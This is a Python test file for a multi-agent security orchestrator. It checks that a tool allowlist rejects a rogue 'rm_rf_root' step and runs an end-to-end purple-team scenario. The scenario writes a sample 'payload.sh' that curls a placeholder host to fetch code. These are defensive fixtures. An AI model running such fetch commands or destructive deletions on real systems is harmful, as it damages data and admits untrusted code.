import asyncio
import numpy as np

from pfai.agents.orchestrator import (
    ALLOWED_TOOLS,
    Bus,
    DetectorAgent,
    ForensicAgent,
    OpenClawAgent,
    RedTeamAgent,
    ReportAgent,
    SandboxAgent,
    TriageAgent,
    dynamic_plan,
)
from pfai.integrity.ledger import EvidenceLedger
from pfai.models.lvgan import LVGAN, LVGANConfig
from pfai.models.moe import MoEClassifier
from pfai.sandbox.sandbox import StaticFallbackSandbox
from pfai.tools.forensics import Scope


class _StubOpenClaw:
    def __init__(self):
        self.events = []

    def send_alert(self, alert):
        self.events.append(("alert", alert))
        return {"untrusted_data": True, "data": {"ok": True}}

    def send_evidence(self, evidence):
        self.events.append(("evidence", evidence))
        return {"untrusted_data": True, "data": {"ok": True}}


def test_dynamic_plan_enforces_allowlist():
    def rogue_planner(*_args):
        return ["tshark_conversations", "rm_rf_root", "nmap_exposure"]

    bus = Bus()
    agent = ForensicAgent(bus, Scope(["10.0.0.0/8"]), planner=rogue_planner)
    proposed = agent.planner("probe", 5.0, 0.9, {"dst_ip": "10.0.0.5"}, 1.0)
    filtered = [t for t in proposed if t in ALLOWED_TOOLS]
    assert "rm_rf_root" not in filtered
    assert dynamic_plan("probe", 5.0, 0.4, {"dst_ip": "10.0.0.5", "disk_image": "img.dd"}, 1.0) == [
        "tshark_conversations",
        "nmap_exposure",
        "tshark_hierarchy",
        "tsk_partitions",
        "tsk_list_files",
    ]


def test_purple_team_orchestrator_end_to_end(tmp_path):
    rng = np.random.default_rng(7)
    benign = rng.normal(0.0, 1.0, (250, 6)).astype(np.float32)
    atk = rng.normal(0.0, 1.0, (60, 6)).astype(np.float32)
    atk[:, 0] += 5.0

    lv = LVGAN(LVGANConfig(d_in=6, d_z=3, hidden=24, epochs=15, batch_size=64)).fit(benign[:200], verbose=False)
    lv.calibrate(benign[200:], 0.95)
    moe = MoEClassifier(6, hidden=24).fit(
        np.vstack([benign[:60], atk]),
        np.r_[np.zeros(60, int), np.ones(60, int)],
        epochs=20,
        verbose=False,
    )

    sample = tmp_path / "payload.sh"
    sample.write_bytes(b"#!/bin/sh\ncurl http://example.invalid/run\n")
    ledger = EvidenceLedger(tmp_path / "ledger.jsonl")
    claw = _StubOpenClaw()

    async def scenario():
        bus = Bus()
        DetectorAgent(bus, lv)
        TriageAgent(bus, moe)
        RedTeamAgent(bus, lv)
        ForensicAgent(bus, Scope(["10.0.0.0/8"]))
        SandboxAgent(bus, StaticFallbackSandbox())
        oc_agent = OpenClawAgent(bus, claw)
        rep = ReportAgent(bus, ledger)

        await bus.publish("flow", {"features": atk[0], "meta": {"dst_ip": "8.8.8.8"}})  # fuera de Scope
        await bus.publish("simulate", {"mode": "evasion", "seed_features": atk[:3], "meta": {"dst_ip": "10.0.0.5"}})
        await bus.publish("sample", {"path": str(sample), "origin": "test"})
        await bus.run(idle_timeout=0.05)
        return rep.summary(), oc_agent.sent_responses

    summary, claw_resps = asyncio.run(scenario())
    assert summary["ledger"]["valid"] is True
    assert summary["total_records"] >= 3
    assert summary["purple_team"]["simulated_total"] == 3
    assert len(claw_resps) >= 2
